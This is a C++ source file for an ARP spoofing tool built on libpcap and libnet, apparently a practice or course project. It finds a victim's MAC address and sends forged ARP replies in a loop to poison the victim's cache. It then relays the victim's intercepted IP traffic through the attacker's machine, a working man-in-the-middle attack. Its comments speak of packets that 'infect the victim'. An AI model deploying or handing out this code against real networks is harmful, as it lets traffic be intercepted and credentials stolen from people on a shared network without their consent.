#include "myARPspoofing.h"

int myPCAP::pcd_init(pcap_t **pcd, char **device){
	char  errorbuffer[ERRBUF_SIZE];	// Error string

    // find the device
	*device = pcap_lookupdev(errorbuffer);
	if (device == NULL) {
		printf("No devices: %s\n", errorbuffer);
		return -1;
	}
	// open the device
	*pcd = pcap_open_live(*device, PACKET_MAX_BYTES, PROMISCUOUS_MODE, WAIT_MAX_TIME, errorbuffer);
	if(*pcd == NULL){
		printf("Cannot open device %s: %s\n", *device, errorbuffer);
		return -1;
	}
}

void myPCAP::sendARPpacket(myARPheader packet){
	if(pcap_sendpacket(pcd, (u_char*)&packet, sizeof(packet)) == -1)
    	printf("ARPrequets: pcap_sendpacket error\n");	
}

int myPCAP::pcapCapture(struct in_addr* ip, struct ether_addr *victim_mac){
	int res = 0;
	int flag = 0;
	int *pflag = &flag;

    while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0){
        if(res == 0)	continue;
        getArpMac(((const char *)&ip->s_addr), victim_mac, pflag);
        if(flag == 1)	break;
    }
	return 1;
}

void myPCAP::getArpMac(const char *ipaddress, struct ether_addr *victim_mac, int* pflag) {
    myARPheader *arph;
    arph = (myARPheader *)packet;
    // if arp
    if(ntohs(arph->eth.ether_type) == ETHERTYPE_ARP){
        if(strncmp((const char *)arph->arp_src_ip, (const char *)ipaddress, 4) == 0){
            FILE *fp = fopen("targetmac.txt", "w");
    		if(fp == NULL){
				printf("file open error");
			}
            fprintf(fp, "%02X:%02X:%02X:%02X:%02X:%02X\n", arph->eth.ether_shost[0], arph->eth.ether_shost[1], arph->eth.ether_shost[2],
            												 arph->eth.ether_shost[3], arph->eth.ether_shost[4], arph->eth.ether_shost[5]);
            fclose(fp);
            *pflag = 1;

            // read mac from the file to send ARP which will infect the victim
			fp = fopen("targetmac.txt", "r");
			char buf[30] = {0};
			fgets(buf, sizeof(buf), fp);
			ether_aton_r(buf, victim_mac);
            fclose(fp);
            return;
        }
    }
}

bool myPCAP::isBroadcast(struct in_addr ip){
	myARPheader *arph;
	myMAC mac_class;
    arph = (myARPheader *)&packet;
    
    if(ntohs(arph->eth.ether_type) == ETHERTYPE_ARP){
    	if(memcmp(arph->arp_src_ip, &ip.s_addr, 4) == 0){
    		if(memcmp(arph->eth.ether_dhost, &mac_class.broadcastMac, ETHER_ADDR_LEN) == 0){
    			printf("\n********** FIND: broadcast *********\n");

            	return 1;
    		}
    	}
    }
    return 0;
}

int myPCAP::packetRelay(myIP ip_info, myMAC mac_info, struct in_addr victim_ip, struct ether_addr target_mac){
	libnet_ethernet_hdr	*ether_header;
	libnet_ipv4_hdr		*ip_header;
	const u_char* temp_packet;

	ether_header = (libnet_ethernet_hdr	*)packet;
	temp_packet = packet + sizeof(libnet_ethernet_hdr);

	if(ntohs(ether_header->ether_type) == ETHERTYPE_IP){
		ip_header = (libnet_ipv4_hdr *)temp_packet;
		if( ( memcmp(&ip_header->ip_src.s_addr, &victim_ip.s_addr, sizeof(struct in_addr)) == 0)
			&& ( memcmp(&ip_header->ip_dst.s_addr, &ip_info.attacker_ip.s_addr, sizeof(struct in_addr)) != 0 )
			&& ( memcmp(ether_header->ether_dhost, mac_info.my_mac_address.ether_addr_octet, sizeof(struct ether_addr)) == 0 ) ) {
			printf("********** FIND: [victim > destination] *********\n");
			memcpy(ether_header->ether_dhost, &target_mac.ether_addr_octet, ETHER_ADDR_LEN);
			memcpy(ether_header->ether_shost, &mac_info.my_mac_address.ether_addr_octet	, ETHER_ADDR_LEN);
			if( pcap_sendpacket(pcd, packet, pkthdr->len) == -1 )
				printf("relay pcap_sendpacket error\n");
		}
	}
	return 1;
}

int myPCAP::arpSpoofing(myARPheader arph, myIP ip_info, myMAC mac_info, struct in_addr victim_ip, struct ether_addr target_mac){
	unsigned long long counter = 0;
	const unsigned long long TIME_LIMIT = 0xfff;
	int is_packet = 0;

	while(1){
		if(counter % TIME_LIMIT == 0){
			sendARPpacket(arph);
			printf("*** SENDING ARP PACKET ***\n");
			counter = 1;
		}
		counter++;
		// packet capture
		is_packet = pcap_next_ex(pcd, &pkthdr, &packet);
		if(is_packet < 0){
			printf("packet_next error\n");
			return 0;
		}
		else if(is_packet == 0)	continue;
		packetRelay(ip_info, mac_info, victim_ip, target_mac);
	}
}

void myPCAP::dumpPayload(const u_char *payload, int len) {
	int i;
	const u_char *ch;

	if(len <= 0)	return;

	ch = payload;
	printf("       ****** PAYLOAD ******\n");
	for(i = 0; i < len; i++) {
		if ( (i % 16) == 0 )	printf("%04x | ", i);
		printf("%02x ", *ch);
		ch++;

		if ( ( (i % 16) == 15 ) && (i != 0) )	printf("\n");
	}
	
	printf("\n");
	return;
}